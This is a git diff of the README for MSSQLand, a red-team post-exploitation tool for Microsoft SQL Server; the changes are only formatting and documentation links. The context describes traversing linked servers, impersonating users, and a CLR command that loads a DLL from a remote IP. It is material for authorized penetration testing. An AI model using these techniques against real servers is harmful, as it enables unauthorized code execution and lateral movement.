@@ -7,7 +7,9 @@ Land gracefully in your target MSSQL DBMS, as if arriving on a business-class fl
 
 MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) database management system (DBMS) in your red activities. Primarily designed for constrained environments where operations must be conducted directly through your beacon. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.
 
-For a full list of available commands, arguments, and actions, check out the [COMMANDS.md](./COMMANDS.md) file.
+## 📖 Documentation
+- For a full list of commands, arguments, and actions, check out [COMMANDS.md](./COMMANDS.md).
+- For an overview of the project structure, refer to [STRUCTURE.md](./STRUCTURE.md).
 
 ## Output
 The tool's precise and structured output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for your reports.  All the output tables are Markdown-friendly and can be directly copied and pasted into your notes. For example, running this command:
@@ -62,7 +64,7 @@ Create the following output:
 ===========================================
 ```
 
-## Show Time 👑
+## 👑 Show Time
 You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth. Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you!
 
 After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 
@@ -158,7 +160,7 @@ Or even use Common Language Runtime (CLR) to load remotely a library with:
 /a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
 ```
 
-## Contributing 🫂
+## 🫂 Contributing 
 Contributions to MSSQLand are welcome and appreciated! Whether it's fixing bugs, adding new features, improving the documentation, or sharing feedback, your effort is valued and makes a difference.
 Open-source thrives on collaboration and recognition. Contributions, large or small, help improve the tool and its community. Your time and effort are truly valued. 
 
@@ -166,14 +168,14 @@ Here, no one will be erased from Git history. No fear to have here—no one will
 
 Please see the [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines on how to get started.
 
-## Origin 🥚
+## 🥚 Origin 
 MSSQLand was initially inspired by [SQLRecon](https://github.com/skahwah/SQLRecon), which provided a solid foundation for MS SQL post-exploitation and reconnaissance. However, during my contributions to SQLRecon — particularly in addressing [chained linked server traversal](https://github.com/skahwah/SQLRecon/issues/16#issuecomment-2048435229) and enhancing user impersonation — I encountered significant roadblocks in how contributions were handled. [My pull request](https://github.com/skahwah/SQLRecon/pull/17), which introduced major improvements in impersonation, chaining, and context management, was ultimately not merged but copy pasted.
 
 Rather than let this work go to waste, I decided to develop MSSQLand, an OOP-driven, modular, and community-friendly alternative. Unlike SQLRecon, which required deep refactoring to make simple modifications, MSSQLand was built with developers in mind. The tool is built with extensibility in mind, allowing integration of new features while maintaining clarity and simplicity. It aims to provide a structured, customizable, and operator-friendly experience for engagements requiring MS SQL exploitation.
 
 While I appreciate the inspiration SQLRecon provided, MSSQLand is designed to be open to contributions, transparent in development, and aligned with the collaborative spirit of open-source software. 
 
-## Disclaimer ⚠️
+## ⚠️ Disclaimer
 This tool is designed for educational purposes only and is intended to assist security professionals in understanding and testing the security of SQL Server environments in authorized engagements. It is specifically crafted to be used in controlled environments, such as:
 - Penetration testing labs (e.g., HackTheBox, OffSec exam scenarios).
 - Personal lab setups designed for ethical hacking and security research.
